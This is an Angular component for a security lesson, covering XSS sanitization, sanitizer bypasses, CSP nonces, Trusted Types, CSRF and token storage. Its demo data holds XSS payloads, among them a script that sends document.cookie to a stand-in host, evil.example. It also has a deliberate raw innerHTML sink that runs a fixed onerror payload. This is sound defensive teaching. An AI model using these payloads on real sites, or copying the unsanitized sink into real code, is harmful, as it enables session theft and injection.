import {
  Component,
  ElementRef,
  SecurityContext,
  computed,
  inject,
  signal,
  viewChild,
} from '@angular/core';
import { FormsModule } from '@angular/forms';
import { DomSanitizer } from '@angular/platform-browser';
import { RouterLink } from '@angular/router';
import { BfPage, Bubbles, Chapter, CodeLab, Layers, Napkin, TapeCard } from '../../../shared/brain';
import type { BubbleTurn, ChapterStop, CodeNote, Layer } from '../../../shared/brain';
import { Compare, Faq, Flow, Predict, Quiz, Remember } from '../../../shared/teaching';
import type { FaqItem, FlowStep, QuizOption } from '../../../shared/teaching';

/**
 * Lesson: Security & Sanitization — what Angular protects you from automatically,
 * where that protection ends, and what you own past that edge.
 *
 * ## Presentation
 *
 * Migrated to the brain-friendly layer (`shared/brain/`, see
 * `expert/change-detection` for the reference implementation and the teaching
 * order it is built around). The order here follows the same discipline — pose
 * the problem, give it a mental model, then work outward through mechanism —
 * applied across six sub-topics instead of one deep one:
 *
 * 1. **XSS and the sanitizer.** The load-bearing live demo: one attacker payload
 *    goes through interpolation, `[innerHTML]` and `DomSanitizer.sanitize` side
 *    by side, so what survives each path is *observed*, not asserted.
 * 2. **Escaping the sanitizer entirely.** The gap the original lesson never
 *    showed: `ElementRef.nativeElement.innerHTML` reaches the exact same DOM a
 *    binding does, with none of the protection — proven live, not just claimed.
 * 3. **Bypassing on purpose**, and the two browser-enforced backstops
 *    (Trusted Types, a nonce-based CSP) that make that bypass auditable instead
 *    of only "reviewed by a human once."
 * 4. **CSRF**, including the quiet failure mode where the XSRF interceptor does
 *    nothing at all and nothing tells you.
 * 5. **Token storage and route guards** — the tradeoffs, and the reminder that a
 *    guard is a UX control, not a security boundary.
 * 6. **Secrets and headers** — what belongs in the bundle, what never does, and
 *    what only your server can enforce.
 *
 * Four sub-concepts came from `docs/COVERAGE-SWEEP.md`'s `expert/security`
 * findings and are new in this pass: the nonce/`CSP_NONCE`/`autoCsp` story, an
 * actual explanation of Trusted Types (previously named twice and never
 * unpacked), the XSRF token's silent gaps on absolute URLs and GET/HEAD, and a
 * live proof that leaving the template layer leaves Angular's protection behind
 * with it.
 */
@Component({
  selector: 'app-lesson-security',
  imports: [
    RouterLink,
    FormsModule,
    BfPage,
    Bubbles,
    Chapter,
    CodeLab,
    Layers,
    Napkin,
    TapeCard,
    Compare,
    Faq,
    Flow,
    Predict,
    Quiz,
    Remember,
  ],
  styleUrl: './security.css',
  templateUrl: './security.html',
})
export class Security {
  /** Angular's sanitizer, used directly so the demo can show what it strips. */
  private readonly sanitizer = inject(DomSanitizer);

  /**
   * The attack payload the live lab runs through each rendering path. Deliberately
   * mixes harmless markup with hostile markup, so "sanitized" is visibly different
   * from "escaped" — and different again from "never went through a binding at all."
   */
  protected readonly payload = signal(
    '<b>Bold survives</b>, <i>so does italic</i> — <a href="javascript:alert(1)">a boobytrapped link</a> <img src="x" alt="" onerror="alert(1)"> <script>alert(1)<\/script>',
  );

  /** The exact string Angular's HTML-context sanitizer produces for {@link payload}. */
  protected readonly sanitized = computed(
    () =>
      this.sanitizer.sanitize(SecurityContext.HTML, this.payload()) ||
      '(the sanitizer stripped everything)',
  );

  /** Ready-made payloads, so each attack shape can be tried without typing it. */
  protected readonly presets = [
    {
      label: 'script tag',
      html: 'Hello <script>document.location="https://evil.example?c="+document.cookie<\/script> world',
    },
    {
      label: 'img onerror',
      // alt="" keeps the payload a working attack (onerror is the vector) while
      // leaving the sanitized image decorative rather than an unlabelled one.
      html: '<img src="x" alt="" onerror="alert(document.cookie)"> a classic — no script tag needed',
    },
    {
      label: 'javascript: link',
      html: '<a href="javascript:alert(1)">win a free prize</a>',
    },
    {
      label: 'iframe injection',
      html: '<iframe src="https://evil.example/phish"></iframe> invisible credential phishing',
    },
    {
      label: 'harmless rich text',
      html: '<b>Bold</b>, <i>italic</i>, <ul><li>lists</li><li>links: <a href="https://angular.dev">angular.dev</a></li></ul> all survive',
    },
  ];

  // ── Escaping the sanitizer — a real DOM mutation, deliberately not alert() ──
  // A fixed, curated payload rather than whatever is in the free-text textarea
  // above: wiring arbitrary user text into a raw DOM sink, even in a lesson
  // about why that is dangerous, is the wrong instinct to model. This one
  // executes for real (the whole point) without an intrusive blocking dialog.

  /** Element the "escape the sanitizer" demo writes into directly. */
  private readonly unsafeSink = viewChild<ElementRef<HTMLDivElement>>('unsafeSink');

  /** Whether the raw-DOM write has been run, for the button/reset pairing. */
  protected readonly unsafeRan = signal(false);

  /**
   * The exact same *kind* of attacker string as the payload above — an `onerror`
   * handler smuggled onto an image — except this one mutates the DOM visibly
   * rather than popping a dialog, so it is safe to actually execute in a live app.
   */
  protected readonly unsafePayload = `<img src="x" alt="" onerror="this.insertAdjacentHTML('afterend','<strong style=color:#a4432c>this really executed — real attacker JavaScript ran, not a screenshot</strong>')">`;

  /** Writes {@link unsafePayload} straight to the DOM, bypassing Angular entirely. */
  protected runUnsafe(): void {
    const sink = this.unsafeSink();
    if (!sink) return;
    // No SecurityContext, no DomSanitizer — this is the raw platform API.
    sink.nativeElement.innerHTML = this.unsafePayload;
    this.unsafeRan.set(true);
  }

  /** Clears the sink so the demo can be run again. */
  protected resetUnsafe(): void {
    const sink = this.unsafeSink();
    if (sink) sink.nativeElement.innerHTML = '';
    this.unsafeRan.set(false);
  }

  // ── Presentation data ──────────────────────────────────────────────────────

  /** The Cross-Cutting track, for the "you are here" rail. */
  protected readonly stops: ChapterStop[] = [
    { label: 'Security' },
    { label: 'i18n', id: 'i18n' },
    { label: 'Accessibility', id: 'a11y' },
    { label: 'Animations', id: 'animations' },
    { label: 'View Transitions', id: 'view-transitions' },
  ];

  /**
   * The binding and the sanitizer, working out loud why the same string gets
   * different treatment depending on which property it lands in.
   */
  protected readonly sanitizerTalk: BubbleTurn[] = [
    {
      who: 'The binding',
      says: "I'm about to write this string into `[innerHTML]`. Here it is — go ahead.",
    },
    {
      who: 'The sanitizer',
      says: "Which context is that? `[innerHTML]` means HTML context — I'll keep structural tags and strip anything that can execute.",
    },
    {
      who: 'The binding',
      says: 'And if I were `[href]` instead, carrying this same kind of string?',
    },
    {
      who: 'The sanitizer',
      says: "Different rulebook entirely — I'd be checking the URL scheme, not tag names. `javascript:` gets neutered; a `<b>` in a URL string would mean nothing to me there.",
    },
    {
      who: 'The binding',
      says: "What if I'm `[src]` on an `<iframe>`?",
    },
    {
      who: 'The sanitizer',
      says: "Then I don't guess at all. RESOURCE_URL can load and *run* code — I refuse by default and make you prove the value is safe yourself, with `bypassSecurityTrust*`.",
    },
  ];

  /** Sample: the four binding contexts and what each one does to the same shape of string. */
  protected readonly contextsSample = `// 1. Interpolation — always HTML-escapes. Context: a plain text node.
<p>{{ userBio }}</p>
// userBio = '<script>alert(1)</script>' → renders as literal text.

// 2. [innerHTML] — SecurityContext.HTML. Structure survives, scripts don't.
<div [innerHTML]="richText"></div>
// richText = '<b>Hi</b><script>evil()</script>' → only <b>Hi</b> renders.

// 3. [href] — SecurityContext.URL. Executable schemes get neutered.
<a [href]="link">profile</a>
// link = 'javascript:steal()' → becomes 'unsafe:javascript:steal()'

// 4. [src] on <iframe>/<script>/<video> — SecurityContext.RESOURCE_URL.
<iframe [src]="embedUrl"></iframe>
// Angular refuses to guess here — it throws unless you bypass it.`;

  /** Line-by-line walkthrough of {@link contextsSample}. */
  protected readonly contextsNotes: CodeNote[] = [
    {
      line: 2,
      text: '`{{ userBio }}` compiles to a **text node** update — the DOM API Angular calls here is `textContent`, never `innerHTML`. There is no HTML parser anywhere in this path, so escaping is not even a choice Angular has to make.',
    },
    {
      line: 6,
      text: "`[innerHTML]` is a property binding to the DOM's own `innerHTML` setter. Angular intercepts the value first and runs it through `SecurityContext.HTML`, which keeps structural tags (`<b>`, `<ul>`, `<a>`) and strips `<script>` and any `on*` attribute.",
    },
    {
      line: 10,
      text: 'A URL-context binding. Angular checks the **scheme**, not the tag — `javascript:`, and a few other executable schemes, get rewritten with an `unsafe:` prefix so the browser refuses to run them. The link still renders; it just goes nowhere dangerous.',
    },
    {
      line: 14,
      text: '`SecurityContext.RESOURCE_URL` — a value that could be *loaded and executed*, not just displayed. There is no safe default to fall back to, so instead of guessing, Angular throws unless the value already passed through `bypassSecurityTrustResourceUrl`.',
    },
  ];

  /** Sample: what Angular calls internally for [innerHTML] — and what raw DOM access skips entirely. */
  protected readonly nativeElementSample = `@Component({ ... })
export class Comment {
  private readonly sink = viewChild<ElementRef<HTMLElement>>('sink');

  renderRaw(html: string): void {
    // No SecurityContext, no DomSanitizer — this is the RAW DOM API.
    // Angular's compiler never sees this call; it cannot intercept it.
    this.sink()!.nativeElement.innerHTML = html;
  }

  // Compare the safe version — same operation, sanitized by hand:
  renderSafely(html: string, sanitizer: DomSanitizer): void {
    const clean = sanitizer.sanitize(SecurityContext.HTML, html);
    this.sink()!.nativeElement.innerHTML = clean ?? '';
  }
}`;

  /** Line-by-line walkthrough of {@link nativeElementSample}. */
  protected readonly nativeElementNotes: CodeNote[] = [
    {
      line: 3,
      text: '`viewChild` hands this component a real DOM node — the same kind of handle `[innerHTML]` uses internally. The difference is entirely in what happens next.',
    },
    {
      line: 8,
      text: "This line is the whole vulnerability. `.nativeElement` is the raw browser `Element`; setting `.innerHTML` on it calls the browser's own HTML parser **directly**. There is no Angular binding here for the sanitizer to hook into — `html` reaches the DOM exactly as it was passed in.",
    },
    {
      line: 13,
      text: '`sanitizer.sanitize(SecurityContext.HTML, html)` is the *exact* function Angular calls internally for every `[innerHTML]` binding — it is a public, injectable method, callable by hand whenever you genuinely need to leave the template layer.',
    },
    {
      line: 14,
      text: '`?? \'\'` matters: `sanitize()` returns `null` for a context it cannot process at all, not an empty string. Skip the fallback and `innerHTML` gets assigned the literal `null` — which JavaScript happily stringifies into the visible text `"null"`.',
    },
  ];

  /** Sample: `bypassSecurityTrust*`, used the one way it is ever legitimate. */
  protected readonly bypassSample = `import { DomSanitizer } from '@angular/platform-browser';

@Component({ ... })
export class VideoPlayer {
  private readonly sanitizer = inject(DomSanitizer);

  // ONLY for a URL your OWN code built — never one that includes
  // a value that came from a user, a query param, or an API response.
  readonly trustedSrc = this.sanitizer.bypassSecurityTrustResourceUrl(
    'https://cdn.example.com/video.mp4',
  );
}

// Template:
// <iframe [src]="trustedSrc"></iframe>`;

  /** Line-by-line walkthrough of {@link bypassSample}. */
  protected readonly bypassNotes: CodeNote[] = [
    {
      line: 1,
      text: "`DomSanitizer` is Angular's own escape hatch — the same service the framework uses internally, available to your code via `inject()`.",
    },
    {
      line: 9,
      text: "`bypassSecurityTrustResourceUrl` returns a special wrapped value, not a plain string. Angular's template binding recognizes the wrapper and skips sanitizing it entirely — for this one value only.",
    },
    {
      line: 10,
      text: 'The URL is a **string literal in your own source file** — nothing about it came from outside the app. That is what makes the bypass defensible: there is nothing here for an attacker to control.',
    },
    {
      line: 15,
      text: "The wrapped value binds exactly like an ordinary `[src]` — the component using it cannot tell the difference. Which is exactly why every `bypassSecurityTrust*` call needs a reviewer's eyes: nothing downstream will catch a mistake here.",
    },
  ];

  /** The five members of the bypass API, as a scanned family rather than a table row each. */
  protected readonly bypassMethods = [
    {
      heading: 'bypassSecurityTrustHtml',
      kicker: '[innerHTML]',
      body: 'Rich HTML you fully control — never on anything with user input woven into it.',
    },
    {
      heading: 'bypassSecurityTrustStyle',
      kicker: '[style]',
      body: 'Dynamic CSS built from values you own — a theme picked from a fixed enum, not a free-text field.',
    },
    {
      heading: 'bypassSecurityTrustUrl',
      kicker: '[href] / [src]',
      body: 'Regular navigable URLs — still URL context, so check the scheme yourself before trusting it.',
    },
    {
      heading: 'bypassSecurityTrustResourceUrl',
      kicker: '[src] on iframe / script',
      body: 'Loadable, executable resources. The one used most in practice — for a fixed CDN domain, never a value read off a request.',
    },
    {
      heading: 'bypassSecurityTrustScript',
      kicker: 'rare',
      body: 'Raw script content. Almost never legitimate — reaching for this usually means a safer API exists one level up.',
    },
  ];

  /** The three rings a payload has to clear to become code that actually runs. */
  protected readonly defenseCore: Layer = { label: 'Your DOM', sub: 'where damage would happen' };
  protected readonly defenseRings: Layer[] = [
    { label: 'CSP header', sub: 'script-src / trusted-types' },
    { label: 'Trusted Types', sub: 'blocks the sink assignment' },
    { label: "Angular's sanitizer", sub: 'strips it from the binding' },
  ];

  /** Sample: the CSP most Angular tutorials ship — and the hole in it. */
  protected readonly cspBeforeSample = `Content-Security-Policy:
  default-src 'self';
  script-src  'self';
  style-src   'self' 'unsafe-inline';  /* "Angular inlines some styles" */
  img-src     'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';`;

  /** Sample: a strict CSP with no `unsafe-inline`, backed by a nonce and Trusted Types. */
  protected readonly cspAfterSample = `Content-Security-Policy:
  default-src 'self';
  script-src  'self' 'nonce-{RANDOM_PER_REQUEST}';
  style-src   'self' 'nonce-{RANDOM_PER_REQUEST}';
  img-src     'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  trusted-types angular angular#unsafe-bypass;`;

  /** Sample: wiring a per-request nonce two ways, plus the CLI's zero-config alternative. */
  protected readonly cspNonceSample = `<!-- index.html — templated per-request by your SSR server -->
<app-root ngCspNonce="{{nonce}}"></app-root>

// app.config.ts — the same nonce, for anything Angular injects
// at bootstrap time, before ngCspNonce on <app-root> would apply
export const appConfig: ApplicationConfig = {
  providers: [{ provide: CSP_NONCE, useValue: nonceForThisRequest }],
};

// angular.json — or skip wiring a nonce yourself entirely:
// "security": { "autoCsp": true }
// The CLI build then computes a strict, hash-based policy for you
// and stamps every generated <script>/<style> tag to match it.`;

  /** Line-by-line walkthrough of {@link cspNonceSample}. */
  protected readonly cspNonceNotes: CodeNote[] = [
    {
      line: 2,
      text: "`ngCspNonce` is a special attribute Angular's renderer recognizes on the root element. It copies whatever value you give it onto every `<style>` tag Angular itself injects at runtime — which is what lets you delete `'unsafe-inline'` from `style-src`.",
    },
    {
      line: 7,
      text: '`CSP_NONCE` is the injection-token version of the same idea, for a value your server computed **before** the template rendered — typically read from the `REQUEST` token in an SSR route and threaded through here.',
    },
    {
      line: 11,
      text: "`autoCsp` is an Angular CLI build option (`angular.json` → `security.autoCsp`). It hashes every script the build produces and writes a strict `script-src` policy that needs neither a nonce nor `'unsafe-inline'` — the least code for the strongest policy, useful when there is no per-request server to template a nonce into.",
    },
  ];

  /** The CSRF attack sequence — why a forged cookie-only request fails. */
  protected readonly csrfFlow: FlowStep[] = [
    { label: 'You log in', detail: 'The server sets a session cookie for your bank.' },
    {
      label: 'You open a new tab',
      detail: 'A malicious page auto-submits a hidden form to the bank, in the background.',
    },
    {
      label: 'The browser attaches the cookie',
      detail: 'Cookies travel with every request to their domain, regardless of which tab sent it.',
      tone: 'warn',
    },
    {
      label: 'The server checks the header',
      detail:
        'The forged request carries no X-XSRF-TOKEN — only your real page could read the cookie and mirror it.',
      tone: 'good',
    },
    {
      label: 'Request rejected',
      detail: 'The cookie alone was never enough to prove the request came from you.',
    },
  ];

  /** Sample: enabling Angular's built-in double-submit-cookie XSRF handling. */
  protected readonly xsrfConfigSample = `// app.config.ts
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',   // your server sets this cookie
        headerName: 'X-XSRF-TOKEN', // Angular mirrors it into this header
      }),
    ),
  ],
};`;

  /** Line-by-line walkthrough of {@link xsrfConfigSample}. */
  protected readonly xsrfConfigNotes: CodeNote[] = [
    {
      line: 5,
      text: "`withXsrfConfiguration` turns on Angular's built-in **double-submit cookie** handling inside `HttpClient` — nothing else to import or wire up.",
    },
    {
      line: 6,
      text: '`cookieName` — the cookie your **server** sets on login. It is deliberately readable by JavaScript (not `HttpOnly`), or Angular could never read it back to mirror it.',
    },
    {
      line: 7,
      text: "`headerName` — for every matching request (see the note below), Angular reads that cookie's current value and copies it into this header automatically. Your server's whole job is checking that the two match.",
    },
  ];

  /** Sample: the auth guard — a redirect built as data, not a navigation side effect. */
  protected readonly authGuardSample = `// Functional route guard — no class needed.
// \`route\` is the route being entered; \`state\` carries the full target URL.
export const authGuard: CanActivateFn = (route, state) => {
  // inject() is legal here: Angular runs guards in an injection context.
  const auth = inject(AuthService);
  const router = inject(Router);

  // true = let the navigation proceed unchanged.
  if (auth.isLoggedIn()) return true;

  // Returning a UrlTree cancels this navigation and starts the redirect as
  // one atomic decision. Calling router.navigate() here instead would return
  // a Promise — which is truthy, so the guard would ALLOW the navigation and
  // the user would flash the protected page before being bounced.
  return router.createUrlTree(['/login'], {
    queryParams: { returnUrl: state.url },
  });
};

// In the route table:
{
  path: 'dashboard',
  loadComponent: () => import('./dashboard').then((m) => m.Dashboard),
  // Runs BEFORE loadComponent, so an anonymous visitor never even
  // downloads the protected chunk.
  canActivate: [authGuard],
}
// Security note: this is a UX control, not a security boundary. Every
// protected API call must independently verify the token server-side.`;

  /** Line-by-line walkthrough of {@link authGuardSample}. */
  protected readonly authGuardNotes: CodeNote[] = [
    {
      line: 3,
      text: '`CanActivateFn` — a plain function type, the modern functional style for guards. `route` is the route being entered; `state` carries the full target URL, including query params.',
    },
    {
      line: 9,
      text: 'Returning the literal `true` tells the router "proceed exactly as requested" — no redirect, nothing rewritten.',
    },
    {
      line: 15,
      text: '`createUrlTree()` builds a navigation target as **data**, without navigating yet. Returning it hands the decision back to the router as one atomic step — there is no window where the protected route is briefly active.',
    },
    {
      line: 23,
      text: '`loadComponent` is a lazy import — the entire reason to put the guard on the **route** rather than inside the component. The chunk is never fetched at all if `canActivate` says no.',
    },
    {
      line: 26,
      text: '`canActivate` takes an **array** — a route can carry more than one guard, and all of them must allow the navigation for it to proceed.',
    },
    {
      line: 28,
      text: 'Route guards run entirely in the browser, where a user with DevTools open can see — and even step past — them. They keep the UI honest; only the backend can make a permission check actually binding.',
    },
  ];

  /** Sample: attaching the token, and transparently refreshing it on a 401. */
  protected readonly interceptorSample = `export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  const token = auth.accessToken(); // a signal or plain method

  if (!token) return next(req); // not logged in — send it unmodified

  const authed = req.clone({
    headers: req.headers.set('Authorization', 'Bearer ' + token),
  });
  return next(authed);
};

// Handle an expired token → refresh → retry, transparently:
export const refreshInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  // This pipes the RESPONSE, not the request — everything above ran on
  // the way out; this runs on the way back.
  return next(req).pipe(
    catchError((err) => {
      // Re-throw anything that isn't an expired token: a 403 or a 500
      // must reach the caller untouched.
      if (err.status !== 401) throw err;
      // The refresh token itself normally lives in an HttpOnly cookie the
      // browser attaches automatically, so it never passes through
      // JavaScript, and an XSS bug cannot steal it.
      return auth.refreshToken().pipe(
        // switchMap swaps the refresh stream for a RETRY of the original
        // request, so the caller receives the real data and never learns
        // a refresh happened at all.
        switchMap(() =>
          next(
            req.clone({
              headers: req.headers.set('Authorization', 'Bearer ' + auth.accessToken()),
            }),
          ),
        ),
      );
    }),
  );
};
// PRODUCTION GAP: as written, ten parallel requests that all 401 fire ten
// refresh calls. Real implementations gate this behind a shared in-flight
// subject so only the first request refreshes and the rest queue behind it.`;

  /** Line-by-line walkthrough of {@link interceptorSample}. */
  protected readonly interceptorNotes: CodeNote[] = [
    {
      line: 1,
      text: '`HttpInterceptorFn` — a functional interceptor, the modern replacement for the `HttpInterceptor` class. `req` is the outgoing request; `next` means "pass it to the next interceptor, or the network if this is the last one."',
    },
    {
      line: 3,
      text: '`auth.accessToken()` reads wherever the token lives — a signal here, which is exactly why re-reading it later, at line 33, picks up a freshly refreshed value.',
    },
    {
      line: 5,
      text: 'Requests made before login pass through **unmodified**. This interceptor never blocks anything; it only decorates requests that have a token to add.',
    },
    {
      line: 8,
      text: '`req.clone({ headers })` — `HttpRequest` objects are immutable. `clone()` is the only way to change one; mutating `req.headers` directly would silently do nothing, the same trap as `HttpParams.set()`.',
    },
    {
      line: 14,
      text: 'A **second**, separate interceptor. Interceptors compose into a chain — this one is entirely about the response, downstream of the one that attaches the token on the way out.',
    },
    {
      line: 22,
      text: 'Only a `401` — token rejected — triggers a refresh. A `403` (forbidden even with a valid token) or a `500` is rethrown untouched, so the real caller sees the real failure instead of a confusing retry.',
    },
    {
      line: 26,
      text: '`auth.refreshToken()` calls the refresh endpoint. Its `HttpOnly` cookie travels along automatically — nothing in this function ever touches it directly, and nothing in this page could even if it wanted to.',
    },
    {
      line: 30,
      text: '`switchMap` here means: once the refresh settles, discard that stream and switch to a **new** one — a retry of the original request. The caller who made the failed call is still on the same subscription and simply receives the retried result.',
    },
    {
      line: 33,
      text: '`auth.accessToken()` is called again, not reused from line 3 — by now `refreshToken()` has updated it, so this reads the **new** token. Reusing the old value would silently retry with the token that just got rejected.',
    },
    {
      line: 41,
      text: 'Worth knowing even though this sample does not fix it: ten requests failing at once each start their own refresh call here, independently. A production version gates refreshes behind one shared in-flight `Observable` so only the first 401 triggers a call and the rest wait on it.',
    },
  ];

  /** Sample: proxying a third-party secret through your own backend. */
  protected readonly backendProxySample = `// Angular calls YOUR backend — no third-party key anywhere in the bundle:
this.http.post('/api/chat', { message });

// Your server holds the real secret and calls the third party itself:
// server.ts (Node) / a Spring @RestController / etc.
const res = await openai.createCompletion({
  apiKey: process.env.OPENAI_KEY, // an env var — never shipped to the browser
  ...
});`;

  /** Sample: what belongs in an Angular environment file, and what never does. */
  protected readonly environmentFilesSample = `// src/environments/environment.ts — committed to git, PUBLIC.
export const environment = {
  production: false,
  apiUrl: 'http://localhost:8080', // fine — it's your own API's address
  gaId: 'G-XXXXXXX',               // fine — analytics IDs are public by design
  // stripeSecretKey: '...'        // NEVER — this file ships to every visitor
};

// environment.prod.ts is swapped in at build time via fileReplacements
// in angular.json — same idea, still public, just different values.`;

  /** OWASP Top 10 items, mapped back to sections earlier on the page. */
  protected readonly owaspItems = [
    {
      code: 'A01',
      title: 'Broken Access Control',
      body: 'Route guards prevent UI access, never API access — the backend authorizes every request independently. See the auth guard section above.',
    },
    {
      code: 'A02',
      title: 'Cryptographic Failures',
      body: 'Never store real secrets client-side; use HTTPS everywhere; proxy anything that needs a key through your backend. See Secrets above.',
    },
    {
      code: 'A03',
      title: 'Injection (XSS)',
      body: "Angular sanitizes template bindings by default. The risk moved: it's now nativeElement, Renderer2 and third-party widgets. See Escaping the sanitizer above.",
    },
    {
      code: 'A05',
      title: 'Security Misconfiguration',
      body: 'A CSP with unsafe-inline is a misconfiguration with a name. Add the headers above, and disable debug endpoints in production.',
    },
    {
      code: 'A07',
      title: 'Identification & Auth Failures',
      body: 'Store tokens safely (HttpOnly cookie > memory > localStorage), expire them, and refresh without leaking the refresh token to JavaScript.',
    },
    {
      code: 'A08',
      title: 'Software & Data Integrity Failures',
      body: "Subresource Integrity hashes on any third-party CDN script; audit npm dependencies — a compromised package runs with your app's full DOM access.",
    },
  ];

  /**
   * The self-test on the sanitizer/bypass split.
   */
  protected readonly contextQuizOptions: QuizOption[] = [
    {
      text: "Call `bypassSecurityTrustHtml(bio)` before binding it — it's the official escape hatch, so it's the right tool for user content.",
      why: 'Backwards. `bypassSecurityTrust*` means "I, the developer, vouch that no part of this string is attacker-controlled." A user\'s own bio is the definition of attacker-controlled — this is precisely the misuse the method\'s name is trying to warn you away from.',
    },
    {
      text: "Bind it with plain `[innerHTML]` and let Angular's sanitizer do its job.",
      correct: true,
      why: 'Right. This is exactly the case automatic HTML-context sanitization exists for: untrusted markup, from an untrusted source, that you still want partially rendered. The sanitizer keeps the formatting tags and strips anything that could execute.',
    },
    {
      text: 'Render it with `{{ bio }}` interpolation, so the bold and italic tags are escaped safely.',
      why: 'Safe, but not what was asked for — interpolation would show the reader literal `<b>` and `</b>` characters instead of bold text. Escaping and rendering-safely-as-HTML are different goals, and interpolation only achieves the first.',
    },
    {
      text: 'Strip all tags yourself with a regular expression before rendering.',
      why: 'A hand-rolled regex is exactly the kind of sanitizer that eventually ships a bypass — HTML has too many equivalent forms (`<img/onerror=`, encoded entities, malformed tags a browser still parses) for a pattern match to catch them all. This is what `DomSanitizer` exists to own instead.',
    },
  ];

  /**
   * The self-test right after watching the same string execute or not, depending
   * only on which line of code moved it into the DOM.
   */
  protected readonly escapeQuizOptions: QuizOption[] = [
    {
      text: "Angular sanitizes `[innerHTML]` bindings but not `[src]`/`[href]` bindings — that's the difference.",
      why: 'Both halves of the demo used the exact same DOM-writing operation; only the *path* to the DOM changed. `[src]`/`[href]` are sanitized too, under URL context — that split is not what this demo shows.',
    },
    {
      text: "Angular's sanitizer runs on the binding, and the raw-DOM call never went through a binding at all.",
      correct: true,
      why: "Exactly. `[innerHTML]` is a property binding Angular compiles and controls — the one place the sanitizer gets a chance to run. `nativeElement.innerHTML = …` is a plain DOM API call your own code made directly; Angular's template layer was never involved and had no opportunity to intercept it.",
    },
    {
      text: 'The payload string itself was different the second time.',
      why: 'It was the identical string, assigned two different ways. If the payload had mattered here, the point of the demo would be lost — the whole lesson is that the SAME string behaves differently depending only on how it reaches the DOM.',
    },
    {
      text: '`ElementRef` is deprecated, so its `nativeElement` no longer respects the sanitizer.',
      why: '`ElementRef` isn\'t deprecated, and it never respected the sanitizer to begin with — this isn\'t a gap that recently opened. Direct DOM access has always bypassed the binding layer. The lesson isn\'t "avoid ElementRef"; it\'s "know that raw DOM APIs skip the binding layer entirely."',
    },
  ];

  /** Absolute-URL / GET·HEAD gap in Angular's XSRF interceptor. */
  protected readonly xsrfPredictAnswer =
    "No — only to the first one. Angular's XSRF interceptor attaches the header to **relative, same-origin** requests only. It skips `GET`/`HEAD` outright (they shouldn't mutate anything), and it skips any **absolute URL** on principle: a token read from your site's cookie is credential material for your site, and forwarding it to a different domain would hand that domain something it has no business receiving. The second call gets no header at all — and if that API expects one, every request 403s. Fix it by proxying the third-party API under your own origin (making the URL relative again), by writing your own interceptor that attaches the header explicitly once you've established real trust with that origin, or by calling `withNoXsrfProtection()` where the XSRF machinery is pure noise anyway (token-in-header auth with no cookie in play).";

  /** JWT storage tradeoffs, three ways. */
  protected readonly storageOptions = [
    {
      storage: 'localStorage',
      xss: 'High — any script on the page can read it',
      csrf: 'None',
      verdict: 'Avoid for session tokens',
    },
    {
      storage: 'JS memory (signal/service)',
      xss: 'Lower — gone on refresh',
      csrf: 'None',
      verdict: 'OK for short-lived access tokens',
    },
    {
      storage: 'HttpOnly cookie (server-set)',
      xss: 'None — JavaScript cannot read it',
      csrf: 'Present — needs a CSRF token',
      verdict: 'Best for refresh tokens',
    },
  ];

  /** The doubts this lesson reliably leaves behind. */
  protected readonly questions: FaqItem[] = [
    {
      q: 'If Angular already sanitizes everything automatically, why does `DomSanitizer` even need to exist as a service I can inject?',
      a: 'Two reasons. Sometimes you legitimately need to render something the automatic sanitizer would strip — a trusted video embed, a PDF viewer — and `bypassSecurityTrust*` is how you tell Angular "I already checked this one." And `sanitizer.sanitize()` lets you run the exact same logic Angular runs internally against a value before doing something manual with it — the safe way to write to `nativeElement.innerHTML` by hand, on the rare occasion you truly need to.',
    },
    {
      q: 'Does the sanitizer protect against SQL injection or other backend attacks?',
      a: 'No — it only ever touches what gets written into the DOM in the browser. Your backend needs its own defenses (parameterized queries, input validation) regardless of what Angular does on the client. Client-side sanitization and server-side validation solve completely different problems, and neither substitutes for the other.',
    },
    {
      q: 'Is `localStorage` really unsafe if my app has zero XSS bugs?',
      a: 'In theory — but that is a bet on a negative you can never fully prove, across every dependency you ship today and every one you add later. A single vulnerable npm package with page access can read `localStorage` directly; it cannot read an `HttpOnly` cookie no matter how it got in. The advice isn\'t "you definitely have an XSS bug," it\'s "don\'t let one be catastrophic if it shows up."',
    },
    {
      q: "My app doesn't use cookie-based sessions — do I need to think about CSRF at all?",
      a: "If every mutating request needs a header token you attach yourself (a JWT in `Authorization`, say) rather than something the browser sends automatically, you're already immune — CSRF specifically exploits credentials the browser attaches *for* you. The moment any cookie-based session enters the picture, even just for a 'remember me' flag, that immunity is gone.",
    },
    {
      q: "Why does `require-trusted-types-for 'script'` only mention `'script'`? Is there a `'style'` version too?",
      a: "Not currently — Trusted Types today governs script-executing sinks (`innerHTML`, a `<script>`'s `src`, `eval`, and similar), which is where genuine code execution happens. Style injection is a real but far smaller risk, and there is no separate enforcement mode for it yet. `'script'` is the value you'll see in essentially every real deployment.",
    },
  ];
}
